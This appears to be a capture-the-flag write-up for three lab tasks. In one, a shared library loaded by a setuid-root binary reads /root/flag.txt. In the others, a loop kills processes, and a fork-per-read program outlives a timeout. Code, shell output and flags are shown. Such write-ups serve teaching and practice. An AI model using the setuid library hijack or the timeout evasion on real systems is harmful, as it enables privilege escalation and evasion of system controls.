## Needle

```c
//program_with_name.c

#include <stdio.h>
#include <stdlib.h>

void* meeting(void* arg) {
    char* flag = malloc(256);
    FILE* f = fopen("/root/flag.txt", "r");
   
    if (f) {
        fgets(flag, 256, f);
        fclose(f);
        return flag; // возвращаем флаг как имя
    }
   
    return "no flag";
}
```

```
ctf@07060b8311ee:~$ file meeting 
meeting: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
ctf@07060b8311ee:~$ nano program_with_name.c
ctf@07060b8311ee:~$ gcc -shared -fPIC -o libmeeting.so program_with_name.c -lpthread
ctf@07060b8311ee:~$ ./meeting
Polythread has your concent and name: threadctf{5hoo71N9_sOme_4TOm1c_f3e7}

Good luck, you'll be dyeing the buttons forever now!
What did you think was going to happen when you give up your name to fay?
```

The meeting binary has the setuid bit (as seen in the file output), meaning it runs with superuser (root) privileges. Because of this, any shared library (.so) it loads via dlopen inherits these privileges.  
We wrote a meeting() function that simply reads the flag file directly from /root/flag.txt.  
The main program calls our function, saves its return value in the name\_pointer variable, and prints it to the screen:  
printf("Polythread has your concent and name: %s\\n", (char\*)name\_pointer);  
So, the fae took the flag (thinking it was our name), and the program printed it.

## Princess 

```
ps aux

while true; do ps -eo pid,ppid,stat,cmd | awk '$3 == "Z" && $4 ~ /princess/ {print $2}' | sort -u | xargs -r kill; sleep 0.1; done
```

```
ls
cat flag.txt
```

The game required us to "tear down" 50 cursed cabins (processes that have a dead "zombie" princess child process, marked as \<defunct\>). We wrote a script that uses ps and awk in a loop to find the zombie princess processes, get the IDs of their parent processes (the cabins), and send them a kill signal. 

##  

## 

## 

## 

## Fortforks

```
bash -c 'cat << "EOF" > r.c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

int main() {
    if (fork() == 0) {
        setsid();
        int f = open("secrets", 0);
        FILE* o = fopen("res.txt", "w");
        char b[8192];
        int n;
       
        while ((n = read(f, b, sizeof(b))) > 0) {
            fwrite(b, 1, n, o);
            fflush(o);
            if (fork()) {
                return 0;
            }
        }
    }
}
EOF
gcc r.c -o r && ./r'
```

```
ctf@2e48de033d1e:~$ tail -n 5 res.txt
MeFJio60QGwierx95lIHTc13HvaLAuqBEumLWSCpR
P0E     NbogD9nBZXE
cfwragU9Qjt1PGXlioPi3UQbN
3fsAVH8p 5gUkF0 pORXbV  KvtltOwCeYMf5WDIYKKM
Congratulations, Agent. The flag is: threadctf{OnLy_PR0peR_11neag3_Ge7_tO_11v3_1N_cA5tle}
```

In this task, we needed to read a huge pipe named secrets within 5 seconds before a timeout killed the process. To avoid stopping the program, we wrote a program that reads the pipe and saves the data to res.txt. After reading each block, the program calls fork(). This makes the parent process exit instantly while the child process continues reading from the same spot. This condition prevents the timeout from killing the reader, allowing it to finish reading in the background. After reconnecting, we got the flag from res.txt.

